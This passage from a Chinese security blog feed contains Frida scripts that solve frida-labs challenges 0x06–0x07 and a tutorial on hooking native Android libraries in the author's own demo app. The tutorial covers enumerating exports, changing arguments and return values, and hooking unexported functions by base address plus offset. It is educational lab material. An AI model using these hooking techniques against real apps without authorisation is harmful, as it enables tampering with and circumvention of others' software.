&#123;</span><br><span class="line">          <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Instance found&quot;</span>);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> checker_obj  = checker.$new();  <span class="comment">// Class Object</span></span><br><span class="line">            checker_obj.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">1234</span>; <span class="comment">// num1</span></span><br><span class="line">            checker_obj.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">4321</span>; <span class="comment">// num2</span></span><br><span class="line">            instance.<span class="title function_">get_flag</span>(checker_obj); <span class="comment">// invoking the get_flag method</span></span><br><span class="line">      </span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271915963.png" alt="image.png"> </p><h1 id="challenge-0x07"><a href="#challenge-0x07" class="headerlink" title="challenge 0x07"></a>challenge 0x07</h1><p>本质是要Hook构造函数 : <strong>$init</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271916674.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271916532.png" alt="image.png"> </p><p>代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found instance of MainActivity&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> check_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">                <span class="comment">// check_class.$init.implementation = function(arg1, arg2) &#123;</span></span><br><span class="line">                <span class="comment">//     console.log(&quot;Check class initialized&quot;);</span></span><br><span class="line">                <span class="comment">//     arg1 = 513;</span></span><br><span class="line">                <span class="comment">//     arg2 = 513;</span></span><br><span class="line">                <span class="comment">//     return this.$init(arg1, arg2);</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">                instance.<span class="title function_">flag</span>(check_class.$new(<span class="number">513</span>, <span class="number">513</span>));</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271920866.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fridaNative层hook</title>
      <link href="/2024/07/14/frida%20Native%E5%B1%82hook/"/>
      <url>/2024/07/14/frida%20Native%E5%B1%82hook/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-测试用例"><a href="#0x00-测试用例" class="headerlink" title="0x00 测试用例"></a>0x00 测试用例</h1><p>本次的hook代码都用 frida-tools方式 书写。首先写一个简单的程序用来测试。后续的测试就在这个程序上小修小改，不做赘述。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:id=&quot;@+id/layout_main&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id=&quot;@+id/btn_print&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_margin=&quot;10dp&quot;</span><br><span class="line">        android:text=&quot;print()&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id=&quot;@+id/btn_add&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_margin=&quot;10dp&quot;</span><br><span class="line">        android:text=&quot;addThreeNum()&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.fridasodemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title class_">View</span>.OnClickListener &#123;</span><br><span class="line">    <span class="keyword">private</span> Button btnPrint;</span><br><span class="line">    <span class="keyword">private</span> Button btnAddThreeNum;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        btnPrint = findViewById(R.id.btn_print);</span><br><span class="line">        btnPrint.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        btnAddThreeNum = findViewById(R.id.btn_add);</span><br><span class="line">        btnAddThreeNum.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_print:</span><br><span class="line">                <span class="type">String</span> <span class="variable">print</span> <span class="operator">=</span> Calc.print();</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, print, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> R.id.btn_add:</span><br><span class="line">                <span class="type">int</span> <span class="variable">add</span> <span class="operator">=</span> Calc.addThreeNum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, String.valueOf(add), Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.fridasodemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> String <span class="title function_">print</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">addThreeNum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOGE(...) __android_log_print(ANDROID_LOG_ERROR, <span class="string">&quot;Tag&quot;</span>, __VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="title function_">Java_com_zyc_fridasodemo_Calc_print</span><span class="params">(JNIEnv *env, jclass clazz)</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *str = <span class="string">&quot;Hello c++&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jint JNICALL</span><br><span class="line"><span class="title function_">Java_com_zyc_fridasodemo_Calc_addThreeNum</span><span class="params">(JNIEnv *env, jclass clazz, jint a, jint b, jint c)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x01-遍历导入-导出函数"><a href="#0x01-遍历导入-导出函数" class="headerlink" title="0x01 遍历导入&#x2F;导出函数"></a>0x01 遍历导入&#x2F;导出函数</h1><p>首先通过ida查看so的导入函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161632060.jpeg" alt="img"> </p><p>导出函数：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161633417.jpeg" alt="img"> </p><p>hook so的导入&#x2F;导出函数需要分别用到 <strong>Module.enumerateImports()</strong> 和 <strong>Module.enumerateExports()</strong> 两个函数。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookImEx</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;以下是导入函数：&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> importMethods = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; importMethods.<span class="property">length</span>; index++) &#123;</span><br><span class="line">        <span class="keyword">const</span> element = importMethods[index];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(element));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;以下是导出函数：&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> exportMethods = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; exportMethods.<span class="property">length</span>; index++) &#123;</span><br><span class="line">        <span class="keyword">const</span> element = exportMethods[index];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(element));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>待so加载好后运行，可以从下列对象的name、address取到函数名和地址：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161634563.jpeg" alt="img"> </p><h1 id="0x02-通过函数名hook导出函数"><a href="#0x02-通过函数名hook导出函数" class="headerlink" title="0x02 通过函数名hook导出函数"></a>0x02 通过函数名hook导出函数</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookByName</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_zyc_fridasodemo_Calc_addThreeNum&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onEnter...&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[0]:&quot;</span>,args[<span class="number">0</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[1]:&quot;</span>,args[<span class="number">1</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[2]：&quot;</span>,args[<span class="number">2</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[3]：&quot;</span>,args[<span class="number">3</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args[4]：&quot;</span>,args[<span class="number">4</span>]);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123; </span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onLeave...&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval:&quot;</span>,retval); <span class="comment">// 函数返回值</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>待so加载好后运行，其中arg[0]为 JNIEnv * 地址，arg[1]为 jclass地址（如果是非静态函数，则是jobject）。后面为三个int，使用 .toInt32 可以转为10进制。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161637160.gif" alt="img"> </p><h1 id="0x03-Hook参数"><a href="#0x03-Hook参数" class="headerlink" title="0x03 Hook参数"></a>0x03 Hook参数</h1><p>根据上面获取的 args 我们可以修改参数，但注意参数得是 <strong>NativePointer</strong>，直接用 “&#x3D;” 赋值会报错“expected a pointer”。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookParam</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_zyc_fridasodemo_Calc_addThreeNum&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                args[<span class="number">2</span>] = <span class="title function_">ptr</span>(<span class="number">1000</span>); <span class="comment">// 写成 args[2]=1000 会报错</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行，点击可以看到返回值已经改变：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407161638522.jpeg" alt="img"> </p><h1 id="0x04-Hook返回值"><a href="#0x04-Hook返回值" class="headerlink" title="0x04 Hook返回值"></a>0x04 Hook返回值</h1><p>修改返回值时，用 “&#x3D;” 并不会报错，但这样的修改不会影响程序变量，如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">    retval = <span class="number">888</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval:&quot;</span>,retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407170948996.gif" alt="img"> </p><p>正确写法需要使用 <strong>replace()</strong> 函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookReturn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;Java_com_zyc_fridasodemo_Calc_addThreeNum&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;&#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">32</span>); <span class="comment">//用 replace() 不要用 =</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval:&quot;</span>,retval);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 如果返回值是jstring，得用下面方式替换</span></span><br><span class="line">               <span class="comment">//var env = Java.vm.getEnv(); //获取env对象，即第一个参数</span></span><br><span class="line">               <span class="comment">//var jstrings = env.newStringUtf(&quot;xxxx&quot;); //返回的是字符串指针，使用jni函数构造一个newStringUtf对象用来代替这个指针</span></span><br><span class="line">               <span class="comment">//retval.replace(jstrings); </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407170951383.jpeg" alt="img"> </p><h1 id="0x05-hook引用传递参数值"><a href="#0x05-hook引用传递参数值" class="headerlink" title="0x05 hook引用传递参数值"></a>0x05 hook引用传递参数值</h1><p>引用传递是C++常见函数写法，这样是没有返回值的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//char* str = &quot;hello&quot;; //这样写会报错，str指向静态存储区不允许修改</span></span><br><span class="line"><span class="type">char</span> str[] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change</span><span class="params">(<span class="type">char</span>* str)</span>&#123;</span><br><span class="line">    cs[<span class="number">0</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    cs[<span class="number">1</span>] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    cs[<span class="number">2</span>] = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要Hook <strong>onEnter()</strong> 和 <strong>onLeave()</strong> 时的指针（参数），就能知道函数的作用：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookPoint</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>, <span class="string">&quot;_Z6changePc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\r\n函数地址：&quot;</span> + address);</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(address, &#123;</span><br><span class="line">            <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onEnter...&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;引用参数：&quot;</span> + args[<span class="number">0</span>].<span class="title function_">readCString</span>()); <span class="comment">//打印cstring</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数处内存：\r\n&quot;</span> + <span class="title function_">hexdump</span>(args[<span class="number">0</span>]));</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">args0</span> = args[<span class="number">0</span>]; <span class="comment">//保存参数，给onLeave()中使用</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;onLeave...&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;引用参数：&quot;</span> + <span class="variable language_">this</span>.<span class="property">args0</span>.<span class="title function_">readCString</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;参数处内存：\r\n&quot;</span> + <span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407170954994.jpeg" alt="img"> </p><h1 id="0x06-获取so基址"><a href="#0x06-获取so基址" class="headerlink" title="0x06 获取so基址"></a>0x06 获取so基址</h1><p>使用 <strong>findBaseAddress()</strong> 可以hook到so的基址：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookBaseAddress</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> address = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (address) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(address); <span class="comment">//这里我获取到的是 0xb8f91000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <strong>cat &#x2F;proc&#x2F;(进程pid)&#x2F;maps</strong> 命令可以验证libnative-lib.so基址。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171002258.jpeg" alt="img"> </p><h1 id="0x07-hook未导出函数"><a href="#0x07-hook未导出函数" class="headerlink" title="0x07 hook未导出函数"></a>0x07 hook未导出函数</h1><p>如果遇到so中动态注册函数的情况，又该如何Hook？在测试用例中增加一个动态注册的printDynamic()。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// public native static String printDynamic(String a); //com.zyc.fridasodemo.Calc类增加此方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// static + JNI_OnLoad动态注册，ida看不到导出</span></span><br><span class="line"><span class="keyword">static</span> jstring <span class="title function_">print_Dynamic</span><span class="params">(JNIEnv *env, jclass clazz, jstring a)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> JNINativeMethod methods[] = &#123;</span><br><span class="line">        &#123;<span class="string">&quot;printDynamic&quot;</span>,<span class="string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span>,(<span class="keyword">void</span>*)print_Dynamic&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="type">int</span> <span class="title function_">registerNatives</span><span class="params">(JNIEnv *env)</span> &#123;</span><br><span class="line">    <span class="comment">//找到声明native方法的类</span></span><br><span class="line">    const <span class="type">char</span>* className  = <span class="string">&quot;com/zyc/fridasodemo/Calc&quot;</span>;</span><br><span class="line">    <span class="type">jclass</span> <span class="variable">clazz</span> <span class="operator">=</span> env-&gt;FindClass(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz == NULL)&#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注册函数 参数：java类 所要注册的函数数组 注册函数的个数</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">methodsNum</span> <span class="operator">=</span> sizeof(methods)/ sizeof(methods[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span>(env-&gt;RegisterNatives(clazz,methods,methodsNum) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span>&#123;</span><br><span class="line">    JNIEnv* env = NULL;</span><br><span class="line">    <span class="comment">//获取JNIEnv</span></span><br><span class="line">    <span class="keyword">if</span> (vm-&gt;GetEnv(reinterpret_cast&lt;<span class="keyword">void</span>**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span>(env != NULL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!registerNatives(env))&#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回jni 的版本</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打release包后用ida检查so的导出函数发现并没有get_two_num()。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171006265.jpeg" alt="img"> </p><p>通过 <strong>JNI_OnLoad()</strong> 找到其地址：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407171006024.jpeg" alt="img"> </p><p>然后就可以用 <strong>基址+偏移</strong> 方式进行Hook了：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookDynamic</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> soAddress = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;so基址：&quot;</span> + soAddress);</span><br><span class="line">    <span class="keyword">if</span> (soAddress) &#123;</span><br><span class="line">        <span class="keyword">const</span> methodAddress = soAddress.<span class="title function_">add</span>(<span class="number">0x0690</span>); <span class="comment">// thrumb指令集要+1</span></span><br><span class="line">        <span class="keyword">if</span> (methodAddress) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;函数地址：&quot;</span> + methodAddress);</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(methodAddress, &#123;</span><br><span class="line">                <span class="title function_">onEnter</span>(<span class="params">args</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook动态注册函数的参数：&quot;</span> + <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(args[<span class="number">2</span>], <span class="literal">null</span>).<span class="title function_">readCString</span>()); <span class="comment">//打印jstring要用getStringUtfChars</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">onLeave</span>(<span class="params">retval</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook动态注册函数的返回值：&quot;</span> + <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">getEnv</span>().<span class="title function_">getStringUtfChars</span>(retval, <span class="literal">null</span>).<span class="title function_">readCString</span>());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行成功：</p><p><img 